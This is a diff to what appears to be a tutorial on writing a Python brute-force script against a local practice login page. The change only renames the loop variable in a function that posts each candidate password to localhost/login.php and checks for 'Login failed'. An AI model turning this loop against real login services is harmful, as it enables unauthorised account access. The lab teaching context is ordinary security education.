@@ -118,9 +118,9 @@ so, just to finish our little script, let's build the last function to do the di
 
 ```python
 def brute_force():
-    for i in PASSWORDS:
+    for password in PASSWORDS:
         set_request_tokens()
-        data['password'] = i
+        data['password'] = password
         response = requests.post('http://localhost/login.php', cookies=cookies, headers=headers, data=data)
         
         if 'Login failed' in response.content.decode('UTF-8'):
